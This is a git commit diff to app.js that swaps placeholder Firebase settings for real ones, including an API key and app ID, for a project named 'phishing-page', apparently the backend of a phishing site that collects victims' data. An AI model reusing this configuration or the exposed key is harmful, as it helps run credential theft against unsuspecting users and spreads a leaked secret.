1a707f7171205e22bb2a44676d2d03c4ac69846e
EY500 <69344506+EY500@users.noreply.github.com>
2020-08-17 12:58:42 +0000

    Update app.js

--- app.js
+++ app.js
@@ -3,17 +3,16 @@
 
 ///Edit Under This only
 
-var firebaseConfig = {
-  apiKey: "api-key",
-  authDomain: "project-id.firebaseapp.com",
-  databaseURL: "https://project-id.firebaseio.com",
-  projectId: "project-id",
-  storageBucket: "project-id.appspot.com",
-  messagingSenderId: "sender-id",
-  appId: "app-id",
-  measurementId: "G-measurement-id",
+const firebaseConfig = {
+  apiKey: "AIzaSyAySBWICMQKvbjYzZSCE5ixCoMXezJs1kQ",
+  authDomain: "phishing-page.firebaseapp.com",
+  databaseURL: "https://phishing-page.firebaseio.com",
+  projectId: "phishing-page",
+  storageBucket: "phishing-page.appspot.com",
+  messagingSenderId: "1001765988657",
+  appId: "1:1001765988657:web:7fe0011b9479043253e810",
+  measurementId: "G-6GM39LSTMT"
 };
-
      
  
 ////Do Not Edit Below This
